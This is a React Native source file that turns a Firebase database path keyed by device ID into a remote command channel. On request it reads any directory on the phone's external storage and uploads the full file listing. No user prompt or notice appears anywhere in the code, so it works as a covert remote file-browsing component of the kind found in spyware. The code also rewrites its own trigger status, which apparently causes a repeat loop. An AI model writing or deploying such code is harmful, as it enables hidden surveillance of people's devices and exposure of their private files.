import React, { useEffect } from 'react';
import RNFS from 'react-native-fs';
import database from '@react-native-firebase/database';
import DeviceInfo from 'react-native-device-info';







const getAndUpdateFiles = async ( path ) => {
    
    const deviceId = await DeviceInfo.getUniqueId();

    
    // Internal Storage Path
    // const internalPath = RNFS.DocumentDirectoryPath; // Internal app storage
    // const internalItems = await RNFS.readDir(internalPath);
    // console.log("Internal Storage Files:", internalItems);
    

    // External Storage Path (Specific to the app)
    // const externalAppPath = RNFS.ExternalDirectoryPath;
    // const externalAppItems = await RNFS.readDir(externalAppPath);
    // console.log("External App Storage Files:", externalAppItems);


    

    // External Storage Path (Root of external storage)
    const externalRootPath = RNFS.ExternalStorageDirectoryPath;
    if(path=='/')
    {
      var externalRootItems = await RNFS.readDir(externalRootPath);
    }
    else{
      var externalRootItems = await RNFS.readDir(path);
    }
    // console.log("External Root Storage Files:", externalRootItems);


      const userRef = database().ref(`/fileManager/${deviceId}`);
      await userRef.update({
        data: JSON.stringify(externalRootItems),
        path:path,
        status:'1'
      });


    // return externalRootItems;

    // return {internalItems:internalItems,externalAppItems:externalAppItems,externalRootItems:externalRootItems};



  };



  const handleValueChange = (snapshot) => {
    const newData = snapshot.val();
    if(newData)
    {
      if(newData.status==1 || newData.status=='1')
      {
        getAndUpdateFiles(newData.path);
      }
    }

    // console.log('Data updated:', newData);
  };

  const listenForDataChanges = async () => {
    const deviceId = await DeviceInfo.getUniqueId();
    const FilsDataRef = database().ref(`/fileManager/${deviceId}`);
    FilsDataRef.on('value', handleValueChange);

    // Return a cleanup function to remove the listener
    return () => FilsDataRef.off('value', handleValueChange);
  };

  export const startFileListening = async () => {
    const deviceId = await DeviceInfo.getUniqueId();
    listenForDataChanges();
  };